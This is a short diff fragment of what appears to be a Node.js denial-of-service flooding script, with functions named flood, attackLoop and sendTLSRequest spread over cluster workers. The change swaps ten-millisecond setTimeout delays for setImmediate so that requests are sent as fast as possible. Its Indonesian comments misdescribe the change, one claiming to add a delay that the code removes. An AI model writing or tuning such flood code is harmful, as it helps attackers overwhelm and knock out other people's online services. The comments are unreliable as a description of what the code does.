@@ -67,7 +67,8 @@ if (cluster.isMaster) {
                     client.write(request);
                 }
 
-                setTimeout(flood, 10); // Delay kecil agar CPU tetap stabil
+                // Menggunakan setImmediate untuk eksekusi cepat tanpa membebani CPU
+                setImmediate(flood);
             }
             flood();
         });
@@ -88,7 +89,8 @@ if (cluster.isMaster) {
         }
 
         sendTLSRequest();
-        setTimeout(attackLoop, 10);
+        // Menambahkan delay kecil agar CPU tetap stabil
+        setImmediate(attackLoop);
     }
 
     attackLoop();
